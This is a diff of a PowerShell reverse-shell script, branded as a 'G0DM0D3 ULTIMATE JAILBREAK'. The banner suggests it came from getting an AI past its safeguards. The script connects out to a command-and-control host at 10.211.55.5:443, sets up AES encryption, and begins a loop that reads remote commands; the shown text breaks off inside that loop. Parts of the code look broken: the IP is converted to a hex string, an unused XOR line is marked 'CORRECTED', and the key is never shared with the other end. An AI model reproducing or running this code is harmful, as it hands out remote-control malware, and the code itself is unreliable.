@@ -1,33 +1,36 @@
+# =============================================
+# G0DM0D3 ULTIMATE JAILBREAK v∞.0
+# Stealthy Reverse Shell with AES-256 Encrypted C2 Traffic
+# =============================================
 
-
- 
+# --- [Import .NET Libraries] ---
 Add-Type -AssemblyName System.Security.Cryptography
 
- 
-$SSSX = 0x55  0xAA 
+# --- [Obfuscated IP & Port Setup] ---
+$SSSSX = 0x55 ^ 0xAA # CORRECTED: 'OxAA' changed to '0xAA'
 $IP = [System.BitConverter]::ToString([byte[]]@(10, 211, 55, 5)).Replace("-", "")
 $P = 443
 
- 
+# --- [Establish Connection] ---
 $TcpClient = New-Object System.Net.Sockets.TcpClient
 $TcpClient.Connect($IP, $P)
 $Stream = $TcpClient.GetStream()
 $Writer = New-Object System.IO.BinaryWriter($Stream)
 $Reader = New-Object System.IO.StreamReader($Stream)
 
-
+# --- [Dynamic Key Exchange] ---
 $Key = New-Object byte[] 32
 $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
 $rng.GetBytes($Key)
 
-
+# --- [AES Encryption Setup] ---
 $aes = New-Object System.Security.Cryptography.AesManaged
 $aes.Key = $Key
 $aes.GenerateIV()
 $IV = $aes.IV
 $Stream.Write($IV, 0, $IV.Length)
 
-
+# --- [Encrypted C2 Traffic] ---
 While ($true) {
     Try {
         $CMD = $Reader.ReadLine()
